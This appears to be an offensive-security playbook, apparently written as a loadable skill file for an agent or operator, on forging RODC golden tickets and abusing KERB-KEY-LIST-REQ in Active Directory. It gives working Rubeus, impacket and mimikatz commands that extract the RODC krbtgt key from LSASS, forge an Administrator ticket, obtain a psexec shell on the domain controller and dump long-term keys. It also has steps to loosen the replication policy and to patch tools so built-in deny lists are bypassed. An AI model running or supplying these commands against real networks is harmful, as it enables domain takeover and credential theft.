# RODC Golden Ticket and KeyList Attack

Load when a compromised RODC's `krbtgt_XXXXX` key is available and the objective is a TGT/TGS accepted by the writable DC, or when using KERB-KEY-LIST-REQ to reveal a target's long-term keys through PRP.

## Concept

An RODC signs tickets with its own `krbtgt_XXXXX` account. The writable DC accepts a TGT forged with this key and issues real TGS tickets for the impersonated user if that user passes the RODC's Password Replication Policy (PRP).

## Requirements

RODC `krbtgt_XXXXX` AES256 key, domain SID, and the RODC number (the `XXXXX` value from `msDS-SecondaryKrbTgtNumber`).

## kvno encoding (mandatory for both paths below)

The ticket's `enc-part.kvno` MUST be `(rodcNumber << 16) | kvno_low`, where `kvno_low` is the `msDS-KeyVersionNumber` of `krbtgt_XXXXX` (usually `1`). Get this wrong and the writable DC returns `KRB_AP_ERR_BAD_INTEGRITY` (golden ticket) or `KDC_ERR_TGT_REVOKED` (KeyList partial TGT with `kvno_low` defaulted to 0).

## PRP prerequisite

Before using a forged ticket or a revealed key, confirm the target passes the RODC's Password Replication Policy:
- Add the target (or a group containing them) to `msDS-RevealOnDemandGroup` on the RODC computer object.
- Remove any deny entry from `msDS-NeverRevealGroup` (or replace with the empty "Allowed RODC Password Replication Group").
- Built-in Administrator (RID 500) is hardcoded-denied from KeyList reveal but CAN be impersonated via the golden ticket + TGS path below.

## krbtgt_XXXXX AES key extraction

An offline `ntds.dit` VSS dump of the RODC does NOT contain AES keys in `supplementalCredentials` for `krbtgt_XXXXX` — only the RC4/NTLM hash. The AES256 key exists only in the RODC's live LSASS. Extract with mimikatz as SYSTEM on the RODC: `lsadump::lsa /inject /name:krbtgt_XXXXX` (output field `aes256_hmac (4096)` under `Kerberos-Newer-Keys`). If running headless via SCM (smbexec, service creation), see the `mimikatz` skill's Headless execution section — stdout is not captured without it.

**Do NOT reset the RODC machine account (e.g. `RODC01$`) password before using RBCD S4U tickets against it** — the RODC's local LSASS retains the old key, causing `STATUS_MORE_PROCESSING_REQUIRED` on Kerberos service ticket validation.

## Golden ticket path

```bash
# Windows — Rubeus (handles kvno automatically via /rodcNumber)
Rubeus.exe golden /rodcNumber:XXXXX /aes256:<krbtgt_XXXXX_aes256> \
  /user:Administrator /id:500 /domain:domain.local \
  /sid:<domain_SID> /flags:forwardable,renewable,enc_pa_rep /nowrap

# Then request TGS for target service against the WRITABLE DC
Rubeus.exe asktgs /ticket:<golden.kirbi> /service:cifs/DC01.domain.local \
  /dc:<writable_dc_ip> /outfile:tgs.kirbi

# Convert + use from Linux
impacket-ticketConverter tgs.kirbi tgs.ccache
export KRB5CCNAME=tgs.ccache
impacket-psexec -k -no-pass domain.local/Administrator@DC01.domain.local

# Linux — impacket ticketer (requires a manual kvno patch if -rodcNo is not available)
# Patch ticketer.py: change kdcRep['ticket']['enc-part']['kvno'] = 2 to (XXXXX << 16) | kvno_low
impacket-ticketer -aesKey <krbtgt_XXXXX_aes256> -domain-sid <sid> \
  -domain domain.local -user-id 500 -groups '512,520,513,519,518' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -spn cifs/DC01.domain.local -dc-ip <dc_ip> -k -no-pass 'domain.local/Administrator'
```

## KeyList attack path (credential reveal, no ticket forgery)

Send a TGS-REQ with `KERB-KEY-LIST-REQ` padata to the writable DC — it reveals the target's long-term keys if PRP allows.

```bash
# impacket secretsdump (requires -rodcNo and -rodcKey flags)
impacket-secretsdump -use-keylist -rodcNo XXXXX \
  -rodcKey <krbtgt_XXXXX_aes256> \
  'domain.local/RODC01$:password@DC01.domain.local' -dc-ip <dc_ip>
```

**Caveats**:
- `secretsdump.py` hardcodes a deny list with RIDs 500-503, so Administrator is client-side excluded — patch `getAllowedUsersToReplicate()` to force-target specific users.
- RC4-encrypted partial TGTs are rejected if the domain has disabled RC4 for Kerberos — use AES256.
